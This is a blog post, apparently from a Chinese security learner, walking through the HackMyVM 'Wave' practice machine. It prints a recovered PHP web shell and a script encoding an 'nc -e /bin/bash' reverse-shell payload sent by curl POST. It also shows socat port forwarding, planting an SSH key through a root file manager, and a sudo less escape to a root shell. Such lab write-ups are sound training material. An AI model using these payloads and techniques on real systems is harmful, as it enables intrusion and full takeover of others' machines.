@@ -1,0 +1,625 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="一直游到海水变蓝">
+    <meta name="author" content="FLow">
+    
+    <title>
+        
+            hackmyvm wave复盘 |
+        
+        Flowww&#39;s blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/aaa.png">
+    
+    
+<link rel="stylesheet" href="/font/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/brands.min.css">
+
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.xml"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#000033","title":"Flowww's blog","author":"FLow","avatar":"https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/aaa.png","logo":"https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/aaa.png","favicon":"https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/aaa.png"},"menu":{"home":"/","archives":"/archives","tags":"/tags","about":"/about"},"first_screen":{"enable":true,"background_img":"/image/bg.svg","background_img_dark":"/images/bg.svg","description":"一直游到海水变蓝","hitokoto":false},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":false,"percent":false,"hide_header":true},"home":{"announcement":null,"category":false,"tag":true,"post_datetime":"created"},"post":{"author_badge":{"enable":false,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":false},"datetime_format":"YYYY-MM-DD","copyright_info":false,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":true,"expand_all":false,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":false,"site_pv":false,"page_pv":true}},"search":{"path":"search.json","field":"post","content":true,"format":"striptags"},"local_search":{"enable":true,"preload":true},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.21"},"waline":{"server_url":null,"reaction":false,"version":2},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2020,"word_count":false,"icp":{"enable":false,"record_code":null,"url":"https://beian.miit.gov.cn"},"site_deploy":{"enable":false,"provider":"github","url":null},"shields_style":{"enable":false,"custom":[{"link_url":null,"img_url":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.1.0"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/aaa.png">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               Flowww&#39;s blog
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                
+                                首页
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                
+                                归档
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                
+                                标签
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                
+                                关于
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/"
+                    >首页</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives"
+                    >归档</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags"
+                    >标签</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about"
+                    >关于</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        hackmyvm wave复盘
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/aaa.png">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">FLow</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2024-03-22</span>
+            </span>
+
+            <span class="meta-info-item post-update-date">
+                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                <span class="datetime" data-updated="Sat Mar 23 2024 21:27:45 GMT+0800">2024-03-23</span>
+            </span>
+        
+
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/hackmyvm/">hackmyvm</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/%E5%A4%8D%E7%9B%98/">复盘</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body">
+                    
+
+                    <h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>这个靶机我是边看视频学习边做的的，写复盘目的是理清思路，吸收知识。在这里感谢群主做的视频，链接：<a class="link"   target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Uu4m1A7BU" >https://www.bilibili.com/video/BV1Uu4m1A7BU<i class="fas fa-external-link-alt"></i></a> </p>
+<h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>地址：<a class="link"   target="_blank" rel="noopener" href="https://hackmyvm.eu/machines/machine.php?vm=Wave" >https://hackmyvm.eu/machines/machine.php?vm=Wave<i class="fas fa-external-link-alt"></i></a></p>
+<p>难度：medium</p>
+<p>ip：192.168.64.81</p>
+<p>（后面由于靶机重置，ip改为192.168.64.100）</p>
+<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>端口扫描扫到22和80端口，先到80端口，没什么东西，然后扫目录，还挺有东西</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322155511.png" ></p>
+<p>robots.txt指示要访问&#x2F;backup</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322155642.png" ></p>
+<p>就是有一些目录文件，然后注意到index,log,phptest.robots,他们有备份文件证明有源文件，比如index对应index.php,phptest对应phptest.php，那么也有一个叫weevely的文件，文件后缀未知。先下载看看。</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322160208.png" ></p>
+<p>一个 PHP Phar（PHP 归档）文件，思路是改名为weevely.phar，然后用脚本还原成php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$phar = new Phar(&quot;weevely.phar&quot;); $phar-&gt;extractTo(&quot;./weevely&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>解压到子目录weevely下面，解压出来的php，用ai解释一下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 定义变量：密钥 $k、密钥头部 $kh、密钥尾部 $kf、参数 $p</span></span><br><span class="line"><span class="variable">$k</span> = <span class="string">&quot;3ddf0d5c&quot;</span>;</span><br><span class="line"><span class="variable">$kh</span> = <span class="string">&quot;b6e7a529b6c2&quot;</span>;</span><br><span class="line"><span class="variable">$kf</span> = <span class="string">&quot;d598a771749b&quot;</span>;</span><br><span class="line"><span class="variable">$p</span> = <span class="string">&quot;afnqDsRcBpVmU71y&quot;</span>;</span><br><span class="line"><span class="comment">// 定义函数：执行异或加密操作</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"><span class="variable">$t</span>, <span class="variable">$k</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$k</span>); <span class="comment">// 计算密钥的长度</span></span><br><span class="line">    <span class="variable">$l</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$t</span>); <span class="comment">// 计算文本的长度</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="string">&quot;&quot;</span>; <span class="comment">// 初始化结果字符串</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 循环遍历文本，执行异或加密操作</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$l</span>;) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; (<span class="variable">$j</span> &lt; <span class="variable">$c</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="variable">$l</span>); <span class="variable">$j</span>++, <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$o</span> .= <span class="variable">$t</span>[<span class="variable">$i</span>] ^ <span class="variable">$k</span>[<span class="variable">$j</span>]; <span class="comment">// 对文本中的每个字符与密钥进行异或操作，并将结果追加到$o中</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$o</span>; <span class="comment">// 返回加密后的结果</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 从输入中解析数据并尝试执行解密的PHP代码</span></span><br><span class="line"><span class="keyword">if</span> (@<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/<span class="subst">$kh</span>(.+)<span class="subst">$kf</span>/&quot;</span>, @<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>), <span class="variable">$m</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">    @<span class="title function_ invoke__">ob_start</span>(); <span class="comment">// 启动输出缓冲区</span></span><br><span class="line">    @<span class="keyword">eval</span>(@<span class="title function_ invoke__">gzuncompress</span>(@<span class="title function_ invoke__">x</span>(@<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$m</span>[<span class="number">1</span>]), <span class="variable">$k</span>))); <span class="comment">// 解密并执行从输入中提取的PHP代码</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$o</span> = @<span class="title function_ invoke__">ob_get_contents</span>(); <span class="comment">// 获取输出缓冲区的内容</span></span><br><span class="line">    @<span class="title function_ invoke__">ob_end_clean</span>(); <span class="comment">// 清空输出缓冲区</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$r</span> = @<span class="title function_ invoke__">base64_encode</span>(@<span class="title function_ invoke__">x</span>(@<span class="title function_ invoke__">gzcompress</span>(<span class="variable">$o</span>), <span class="variable">$k</span>)); <span class="comment">// 对执行结果进行压缩、加密</span></span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;<span class="subst">$p</span><span class="subst">$kh</span><span class="subst">$r</span><span class="subst">$kf</span>&quot;</span>); <span class="comment">// 输出加密后的结果</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>代码逻辑是：php:&#x2F;&#x2F;input也就是接受POST的数据，和$kh,$kf拼接后，先base64解密，经过x函数异或，再用gzuncompress提取出php代码交给eval执行，执行后会把执行结果交给前面一套过程逆向执行。</p>
+<p>也就是说，如果我要利用eval执行命令，正常传进去后会被执行一系列逻辑变成乱的，这样自然会执行失败，<strong>思路是写一个脚本，把原先的思路逆过来，传输进去后经过处理会变成正常语句</strong>，脚本如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$k</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="title function_ invoke__">strlen</span>(<span class="variable">$k</span>);<span class="variable">$l</span>=<span class="title function_ invoke__">strlen</span>(<span class="variable">$t</span>);<span class="variable">$o</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="variable">$l</span>;)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>;(<span class="variable">$j</span>&lt;<span class="variable">$c</span>&amp;&amp;<span class="variable">$i</span>&lt;<span class="variable">$l</span>);<span class="variable">$j</span>++,<span class="variable">$i</span>++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$o</span>.=<span class="variable">$t</span>[<span class="variable">$i</span>]^<span class="variable">$k</span>[<span class="variable">$j</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$o</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 函数照搬</span></span><br><span class="line"><span class="variable">$k</span>=<span class="string">&quot;3ddf0d5c&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$r</span>=@<span class="title function_ invoke__">base64_encode</span>(@<span class="title function_ invoke__">x</span>(@<span class="title function_ invoke__">gzcompress</span>(<span class="string">&quot;echo shell_exec(&#x27;nc -e /bin/bash 192.168.64.3 8888&#x27;);&quot;</span>),<span class="variable">$k</span>));</span><br><span class="line"><span class="comment">// 这句也可以照搬，中间写入要执行的命令</span></span><br><span class="line"><span class="keyword">print</span>(<span class="variable">$r</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>接下来就可以向weevely发送数据，现在问题是不知道他的后缀，fuzz一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w extension.txt -u &#x27;192.168.64.81/weevely.FUZZ&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>extension.txt里面是一些常见的php后缀，最后测出来是php7</p>
+<p>指定脚本，获得要发生的数据，接下来就访问weevely.php7发送POST</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST http://192.168.64.100/weevely.php7 -d <span class="string">&#x27;b6e7a529b6c2S/gvK/6sYkv9LKmvuSuYK36yNKl7MuUuZrQrrPy3eikfqjRWhFDnUAfXtFUDtQY1g2RmE30PNa1oa3Q=d598a771749b&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240323211020.png" ></p>
+<p>成功反弹的第一个shell</p>
+<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>经过一番搜寻，查看到靶机对内开放了3923端口</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240323211135.png" ></p>
+<p>利用socat端口转发到8001端口，访问看看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP-LISTEN:8001,fork TCP:localhost:3923</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240323211236.png" ></p>
+<p>是一个长的比较可爱的文件管理界面，当前目录是&#x2F;root，有文件上传功能也有创建目录功能，那么思路是 <strong>创建一个.ssh目录，在里面上传自己kali的公钥，命名为authorized_keys,然后用攻击机ssh登陆</strong></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240323211509.png" ></p>
+<p>上传后看一下有哪些用户名</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-23%2021.15.52.png" ></p>
+<p>经过尝试，angie登陆成功</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240323211749.png" ></p>
+<p>Sudo -l 查到less可以利用，只能用来阅读&#x2F;opt&#x2F;secret.txt</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240323211813.png" ></p>
+<p>看题解学习到提权思路是：</p>
+<p>首先less的功能是读取文件，当它读取的文件有很多行一个终端显示不下的时候，最下面可以有一个命令行，我们可以利用这一点输入命令拿到一个&#x2F;bin&#x2F;sh。然后靶机的secret.txt只有两行，这个时候我们只能去kali本机的终端操作，把终端尺寸缩到很小，自然会出现命令行。</p>
+<p>输入“sudo &#x2F;usr&#x2F;bin&#x2F;less -F &#x2F;opt&#x2F;secret.txt”，然后缩小终端</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240323212531.png" ></p>
+<p>缩到这么小，再输入”!&#x2F;bin&#x2F;sh”，成功拿到shell，提权成功。</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240323212632.png" ></p>
+
+                </div>
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/hackmyvm/">hackmyvm</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/%E5%A4%8D%E7%9B%98/">复盘</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2024/03/22/hackmyvm-pam%E5%A4%8D%E7%9B%98/"
+                                   title="hackmyvm pam复盘"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">hackmyvm pam复盘</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="nav-number">1.</span> <span class="nav-text">写在前面</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="nav-number">2.</span> <span class="nav-text">靶机信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-number">3.</span> <span class="nav-text">信息搜集</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">4.</span> <span class="nav-text">提权</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="border-box website-info-box default">
+        
+            <div class="copyright-info info-item default">
+                &copy;&nbsp;<span>2020</span>&nbsp;-&nbsp;2024
+                
+                    &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">FLow</a>
+                
+            </div>
+
+            <div class="theme-info info-item default">
+                由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+            </div>
+
+            
+
+            
+        
+
+        <div class="count-item info-item default">
+            
+
+            
+
+            
+        </div>
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="tools-list border-box">
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-toggle-theme-mode flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="nav-number">1.</span> <span class="nav-text">写在前面</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="nav-number">2.</span> <span class="nav-text">靶机信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-number">3.</span> <span class="nav-text">信息搜集</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">4.</span> <span class="nav-text">提权</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+<!-- common -->
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/toggle-theme.js"></script>
+
+<script src="/js/code-block.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+
+<!-- local-search -->
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+<!-- lazyload -->
+
+
+<div class="">
+    
+        <!-- post-helper -->
+        
+<script src="/js/post/post-helper.js"></script>
+
+
+        <!-- toc -->
+        
+            
+<script src="/js/post/toc.js"></script>
+
+        
+
+        <!-- copyright-info -->
+        
+
+        <!-- share -->
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+
+
+</body>
+</html>
